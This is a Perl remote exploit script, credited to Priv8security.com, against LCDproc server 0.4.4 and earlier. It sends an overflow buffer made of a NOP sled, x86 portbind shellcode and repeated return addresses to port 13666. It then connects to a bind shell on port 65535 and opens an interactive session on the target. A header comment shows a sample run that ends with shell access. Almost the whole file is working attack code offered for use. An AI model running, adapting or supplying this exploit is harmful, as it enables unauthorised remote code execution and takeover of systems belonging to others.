#!/usr/bin/perl
# Priv8security.com remote exploit for lcdproc server version 0.4.4 and lower.
#
#   Vendor Url: http://lcdproc.omnipotent.net/
#   Play with offset "-o" to get shell.
#
#   [wsxz@localhost wsxz]$ perl priv8lcd44.pl -h localhost -t 0
#
#   -=[ Priv8security.com LCDproc Server 0.4.4 and lower remote exploit ]=-
#
#   Connected!
#   [+] Using address: 0xbfffd904
#   [+] Checking version... 0.4.4
#   [+] Sending stuff... Done!
#   [+] Do we got a shell?
#   [+] Enjoy your stay on this server =)
#
#   ******  Welcome to 'localhost'  ******
#
#   Linux localhost.localdomain 2.4.21-0.13mdk #1 Fri Mar 14 15:08:06 EST 2003
#   i686 unknown unknown GNU/Linux
#   uid=503(wsxz) gid=503(wsxz) groups=503(wsxz),13(news)
#
################################################################################

use IO::Socket;
use Getopt::Std; getopts('h:p:t:o:', \%args);


if (defined($args{'h'})) { $host   = $args{'h'}; }
if (defined($args{'p'})) { $port   = $args{'p'}; }else{$port = 13666;}
if (defined($args{'t'})) { $system = $args{'t'}; }
if (defined($args{'o'})) { $offset = $args{'o'}; }else{$offset = 0;}

print "\n-=[ Priv8security.com LCDproc Server 0.4.4 and lower remote exploit ]=-\n\n";
if(!defined($host)){
print "Usage:
        -h <host>
	-p port <default 13666>
	-t target:
	    0 - linux
	    1 - freebsd
	-o <offset>\n\n";
exit(1);
}

#Priv8 portbind shellcode by Ramon de Carvalho
$shellinux = 
"\x31\xdb\xf7\xe3\x53\x43\x53\x6a".
"\x02\x89\xe1\xb0\x66\xcd\x80\xff".
"\x49\x02\x6a\x10\x51\x50\x89\xe1".
"\x43\xb0\x66\xcd\x80\x89\x41\x04".
"\xb3\x04\xb0\x66\xcd\x80\x43\xb0".
"\x66\xcd\x80\x59\x93\xb0\x3f\xcd".
"\x80\x49\x79\xf9\x68\x2f\x2f\x73".
"\x68\x68\x2f\x62\x69\x6e\x89\xe3".
"\x52\x53\x89\xe1\xb0\x0b\xcd\x80";
#Priv8 portbind shellcode by Ramon de Carvalho
$shellfree =
"\x31\xc0\x50\x6a\x01\x6a\x02\x89".
"\xe7\x50\xb0\x61\xcd\x80\xff\x4f".
"\x02\x6a\x10\x57\x50\x50\xb0\x68".
"\xcd\x80\x89\x47\xf4\xb0\x6a\xcd".
"\x80\xb0\x1e\xcd\x80\x50\x50\xb0".
"\x5a\xcd\x80\xff\x4f\xec\x79\xf7".
"\x50\x68\x2f\x2f\x73\x68\x68\x2f".
"\x62\x69\x6e\x89\xe3\x50\x54\x53".
"\x50\xb0\x3b\xcd\x80";

if($system == 1 ){#freebsd buffer
  $ret = 0xbfbfde58 - $offset;
  $retb = $ret - 0x0808b1e6;
  $shellcode = $shellinux;
}
if($system == 0){#linux buffer
  $ret = 0xbfffd904 - $offset; #for ver 0.4.3
  $retb = $ret - 0x0807057e;
  $shellcode = $shellinux;
}

  $new_ret = pack('l', ($retb));
  $buffer = "priv8_func ";
  $buffer .= "\x90" x (3000 - length($shellcode));
  $buffer .= $shellcode;
  $buffer .= (" \xe8" . $new_ret) x 264;

$sock = IO::Socket::INET->new(Proto=>"tcp", PeerHost=>$host,PeerPort=>$port,Type=>SOCK_STREAM,Reuse=>1)
or die "[-] Cant connect\n";

  print "Connected!\n";
  print "[+] Using address: 0x", sprintf('%lx',($ret)), "\n";
  print STDERR "[+] Checking version...";
  print $sock "hello";
  $sock->recv($awser,25);
  $ver = substr($awser,16,5);
  print STDERR " $ver\n";
  print STDERR "[+] Sending stuff... ";
  sleep(2);
  print $sock "$buffer\n";
  print STDERR "Done!\n";
  print "[+] Do we got a shell?\n";

  sleep(3);

$sc = IO::Socket::INET->new(Proto=>"tcp", PeerHost=>$host,PeerPort=>65535,Type=>SOCK_STREAM,Reuse=>1)
or die "[-] No luck, try other offset.\n";

  print "[+] Enjoy your stay on this server =)\n";

  $sc->autoflush(1);

  print $sc "echo;echo \"******  Welcome to '`hostname`'  ******\"\n";
  print $sc "echo;uname -a;id;echo\n";

  die "cant fork: $!" unless defined($pid = fork());

  if ($pid) {
      while(defined ($line = <$sc>)) {
          print STDOUT $line;
      }
      kill("TERM", $pid);
  }
  else
  {
      while(defined ($line = <STDIN>)) {
          print $sc $line;
      }
  }
  close($sc);
  print "Good bye!!\n";


